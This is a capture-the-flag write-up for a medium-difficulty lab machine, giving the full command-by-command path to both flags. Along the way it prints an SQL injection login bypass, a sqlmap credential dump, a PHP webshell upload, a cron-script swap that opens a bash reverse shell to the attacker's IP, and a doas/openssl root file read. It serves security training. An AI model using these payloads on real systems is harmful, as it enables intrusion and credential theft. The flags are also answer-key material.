---

### Challenge propertie(s) :
- ##### Difficulty : medium
- ##### Techniques : port scanning, web fuzzing, mislabeled service (misidentified port), client-side JavaScript analysis, SQL injection (error-based / time-based blind), MD5 hash cracking, unfiltered file upload (RCE), directory-permission abuse (cron), reverse shell, privesc enumeration (LinPEAS), insecure `doas` configuration, GTFOBins abuse (openssl).
- ##### tools : nmap, gobuster, curl, sqlmap, hashcat, netcat (nc), python3 (pty), LinPEAS, openssl.

### Challenge steps :

#### Part 1 : user.txt

1. Port scan followed by a version-detection scan on the target IP.
	-> `nmap 10.10.0.28`
	-> `nmap -sV -sC 10.10.0.28`
	Output :
	-> `80/tcp open http`
	-> `445/tcp open http Apache httpd 2.4.68 ((Debian))`

	nmap guesses port 445 as SMB by default (standard `microsoft-ds` port), but `-sV` reveals it's actually HTTP, not SMB.

2. Fuzzing port 80 with gobuster.
	-> `gobuster dir -u http://10.10.0.28:80 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,bak,zip,old,conf -t 50 -o gobuster_80.txt`
	Output :
	-> `lower (Status: 301) [Size: 348] [--> http://10.10.0.28/lower/]`

	A `/lower/` folder is discovered. Visiting it leads straight into a rabbit hole: the page only contains a background image (`bg`), with no exploitable content whatsoever. Given the "Demon Slayer" theme of the site (the demon ranks "Upper Moon" and "Lower Moon"), this is a deliberate narrative trap.

3. Following the same thematic logic, port 445 is tested manually with `lower` then `upper`, without running gobuster again.
	-> `curl -i http://10.10.0.28:445/lower`
	-> `curl -i http://10.10.0.28:445/upper`
	Output :
	-> `HTTP/1.1 301 Moved Permanently` -> `Location: http://10.10.0.28:445/upper/`

	This is the actual CTF application: **"Demon Human Food Tracker"**, an admin panel built on AdminLTE (Bootstrap).

4. The login form (`/upper/admin/login.php`) appears to submit to itself. The `dist/js/script.js` file, referenced in a `<script src="...">` tag in this page's HTML, is spotted and inspected before testing an injection.
	-> `curl http://10.10.0.28:445/upper/admin/login.php`
	-> `curl -s http://10.10.0.28:445/upper/dist/js/script.js`
	Output :
	-> the real call is made via AJAX to `classes/Login.php?f=login`, not to `login.php`.

5. Testing the injection on the right endpoint: a normal request, then a single quote to break the syntax, then the bypass payload.
	-> `curl -i -X POST "http://10.10.0.28:445/upper/classes/Login.php?f=login" -d "username=test&password=test"`
	-> `curl -i -X POST "http://10.10.0.28:445/upper/classes/Login.php?f=login" -d "username=test'&password=test"`
	-> `curl -i -X POST "http://10.10.0.28:445/upper/classes/Login.php?f=login" -d "username=admin' -- &password=x"`
	Output :
	-> normal request: `{"status":"incorrect","last_qry":"SELECT * from users where username = 'test' and password = md5('test') "}` (plain `last_qry` leak)
	-> single quote: `HTTP/1.0 500 Internal Server Error` (confirms the character breaks the query)
	-> `--` payload: back to `HTTP/1.1 200 OK`, with `last_qry` showing the password check neutralized. Injection confirmed.

6. Dumping the `users` table with sqlmap, targeted directly at the useful columns.
	-> `sqlmap -u "http://10.10.0.28:445/upper/classes/Login.php?f=login" --data="username=admin&password=x" -p username --batch --dbms=mysql --technique=T --time-sec=2 -D daemon -T users -C username,password --dump`
	Output :
	-> `users` table (`daemon` database): `muzan` (MD5 hash auto-cracked to `admin123`) and `kokushibo` (cracked to `jsmith123`).

7. Logging into the admin panel with the retrieved credentials.
	-> `curl -s -c cookies.txt -X POST "http://10.10.0.28:445/upper/classes/Login.php?f=login" -d "username=muzan&password=admin123"`
	Output :
	-> `{"status":"success"}`

8. Uploading a PHP webshell via the logo/cover upload form on the "System Info" page (`classes/SystemSettings.php?f=update_settings`), with no server-side extension filtering.
	-> `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
	-> `curl -s -b cookies.txt -X POST "http://10.10.0.28:445/upper/classes/SystemSettings.php?f=update_settings" -F "img=@shell.php" -F "cover=@shell.php"`
	-> `curl -s -b cookies.txt "http://10.10.0.28:445/upper/uploads/" | grep -oE '[a-zA-Z0-9_-]*\.php'`
	Output :
	-> file uploaded as `1790326560_shell.php`.

9. Confirming RCE.
	-> `curl -s "http://10.10.0.28:445/upper/uploads/1790326560_shell.php?cmd=id"`
	Output :
	-> `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

10. Searching for files owned by the system user `muzan`.
	-> `find / -user muzan 2>/dev/null`
	Output :
	-> `/home/muzan` (inaccessible), `/var/www/scripts/immortality_check.sh`, `/tmp/muzan_watch.log`

	A `.sh` script sitting next to a `.log` file suggests a scheduled task (cron).

11. Checking the permissions of the script and its parent directory.
	-> `curl -s ".../shell.php?cmd=ls%20-la%20/var/www/scripts/"`
	Output :
	-> file: `-rwxr-xr-x 1 muzan muzan ...` (not editable by www-data)
	-> parent directory: `drwxr-xr-x 1 www-data www-data ...` (owned by www-data)

	Unix permission flaw: the parent directory is owned by `www-data`, who therefore has the right to **delete and recreate** the script, despite not being able to edit it directly.

12. Confirming via the system crontab.
	-> `cat /etc/crontab`
	Output :
	-> `* * * * * muzan /var/www/scripts/immortality_check.sh`

13. Replacing the script with a reverse shell pointing to the attacker's IP, then listening and waiting for the cron to trigger.
	-> `curl -s ".../shell.php?cmd=rm%20/var/www/scripts/immortality_check.sh"`
	-> `curl -s ".../shell.php?cmd=echo%20%27%23%21/bin/bash%0Abash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.8.1.12/4445%200%3E%261%22%27%20%3E%20/var/www/scripts/immortality_check.sh"`
	-> `curl -s ".../shell.php?cmd=chmod%20%2Bx%20/var/www/scripts/immortality_check.sh"`
	-> `nc -lvnp 4445`
	Output :
	-> connection received, interactive shell as `muzan`.

14. Directly reading the user flag.
	-> `cat user.txt`
	Output :
	-> `EPI{j00_H4V3_n0_cH01C3_8UT_t0_90_0n_l1v1n9}`

#### Part 2 : root.txt

1. Once logged in as `muzan`, checking sudo rights.
	-> `sudo -n -l`
	Output :
	-> `sudo: a password is required`

	No NOPASSWD `sudo` rights for `muzan`. This path is a dead end.

2. With no sudo lead, a full LinPEAS scan is launched.
	-> transferring `linpeas.sh` via an HTTP server on the attacker side, executing it, and retrieving the output.

3. The section dedicated to `doas` (a lightweight alternative to `sudo`) reveals the flaw.
	Output :
	-> `Doas binary has SUID bit set! -rwsr-xr-x 1 root root ... /usr/bin/doas`
	-> `Found: /etc/doas.conf` -> `permit nopass muzan as root cmd openssl`

	The `doas` configuration allows `muzan` to run `openssl` as **root**, without a password.

4. Manually confirming this from the interactive shell.
	-> `cat /etc/doas.conf`
	Output :
	-> `permit nopass muzan as root cmd openssl`

5. `openssl` is listed on GTFOBins for this kind of abuse (category "File read"): its `enc` subcommand, without an actual cipher, behaves as a simple file pass-through.
	Source : https://gtfobins.org/gtfobins/openssl/
	-> `doas openssl enc -in /root/root.txt`
	Output :
	-> `EPI{1_w1ll_no7_7Rampl3_on_7h3_Pa1N5_of_B31n9_A_d3mon}`
